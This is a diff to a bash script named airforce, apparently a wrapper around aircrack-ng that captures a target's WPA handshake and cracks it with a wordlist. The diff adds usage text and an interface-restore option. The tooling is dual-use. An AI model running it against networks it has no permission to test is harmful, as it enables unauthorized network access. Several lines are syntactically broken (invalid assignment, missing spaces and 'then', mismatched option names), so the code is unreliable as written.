@@ -4,12 +4,21 @@ version=1.1
 cancrack=y
 
 # Check if Parameters are set
-if [ "$2" = "" ]; then
+if [ "$2" == "" ]; then
   echo "Airforce Version $version"
-  echo " "
-  echo "Use: airforce [INTERFACE] [PATH/TO/PASSWORDLIST]"
-  echo "     airforce [INTERFACE] --no-wordlist"
   echo ""
+  echo "[USAGE]"
+  echo "<Default>"
+  echo "     # airforce [INTERFACE] [PATH/TO/PASSWORDLIST]"
+  echo ""
+  echo "<Only dump, no cracking>"
+  echo "     # airforce [INTERFACE] --no-wordlist"
+  echo ""
+  echo "<Set wlan interface back from monitormode to defaultmode>"
+  echo "     # airforce [INTERFACE] --restore"
+  echo ""
+  echo "[LICENSE]"
+  echo "This Software is free (as in freedom) software by GPLv3"
   echo "www.GitHub.com/MrFlyingToasterman/airforce"
   echo ""
   exit
@@ -22,9 +31,19 @@ if [ "$EUID" != "0" ]; then
 fi
 
 # Ceck for --no-wordlist
-if ["$2" = "--no-wordlist"]; then 
+if [ "$2" == "no-wordlist" ]; then 
     echo "[INFO] --no-wordlist detected"
     $cancrack=n
+fi
+
+# Check for --restore
+if [ "$2" == "restore" ]; then
+    echo "[INFO] Restoring interfaces"
+    airmon-ng stop $1mon
+    systemctl start NetworkManager.service
+    echo "[INFO] Interfaces restored"
+    echo "ready."
+    exit
 fi
 
 echo "Welcome to AirForce!"
@@ -57,13 +76,13 @@ echo "[INFO] Tagging Handshake ..."
 mv handshake-01.cap $target-handshake.cap
 
 if ["$cancrack" = "y"];
-	echo "Start cracking now ? (y/N)"
-	read cracknow
-	if ["$cracknow" = "y"]; then
-		echo "[INFO] Start cracking"
-		echo "[WARNING] If you do not have a valid Handshake, you need to reexec airodump-ng until you get it!"
-		aircrack-ng -w $2 -b $target $target-handshake.cap
-	fi
+    echo "Start cracking now ? (y/N)"
+    read cracknow
+    if ["$cracknow" = "y"]; then
+        echo "[INFO] Start cracking"
+	echo "[WARNING] If you do not have a valid Handshake, you need to reexec airodump-ng until you get it!"
+	aircrack-ng -w $2 -b $target $target-handshake.cap
+    fi
 fi
 
 echo "[INFO] Restoring interfaces"
